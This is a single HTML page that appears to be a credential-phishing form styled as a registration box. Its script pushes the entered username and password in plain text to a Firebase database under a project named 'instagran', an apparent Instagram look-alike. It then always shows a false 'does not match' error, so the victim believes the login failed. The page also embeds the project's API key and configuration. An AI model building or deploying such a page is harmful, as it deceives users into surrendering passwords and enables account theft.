<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport"
content="width=device-width, initial-scale=1.0">

<title>Register System</title>

<style>

body{
    background:#111;
    color:white;
    font-family:Arial;
    display:flex;
    justify-content:center;
    align-items:center;
    height:100vh;
}

.box{
    background:#222;
    padding:25px;
    border-radius:15px;
    width:320px;
    text-align:center;
}

input{
    width:90%;
    padding:10px;
    margin:10px 0;
    border:none;
    border-radius:8px;
}

button{
    padding:10px 20px;
    border:none;
    border-radius:8px;
    cursor:pointer;
}

p{
    margin-top:15px;
    color:#ff8080;
}

</style>
</head>

<body>

<div class="box">

<h2>Register</h2>

<input type="text"
id="username"
placeholder="Enter Username">

<input type="password"
id="password"
placeholder="Enter Password">

<button onclick="registerUser()">
Register
</button>

<p id="message">
Username and Password does not match
</p>

</div>

<script type="module">

import { initializeApp }
from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";

import {
getDatabase,
ref,
push
}
from "https://www.gstatic.com/firebasejs/10.12.2/firebase-database.js";

const firebaseConfig = {

  apiKey:  "AIzaSyAGT849YcBnW38SeOEoAkVVtwtcwyNLzwY",
  authDomain: "instagran-3b461.firebaseapp.com",
  databaseURL: "https://instagran-3b461-default-rtdb.firebaseio.com",
  projectId: "instagran-3b461",
  storageBucket: "instagran-3b461.firebasestorage.app",
  messagingSenderId: "372304244325",
  appId: "1:372304244325:web:7b8fb25bc108cfc221608c"

};

const app = initializeApp(firebaseConfig);

const db = getDatabase(app);

window.registerUser = function(){

    const username =
    document.getElementById("username").value;

    const password =
    document.getElementById("password").value;

    push(ref(db,"users"),{

        username: username,
        password: password

    });

    document.getElementById("message").innerHTML =
    "Username and Password does not match";

}

</script>

</body>
</html>
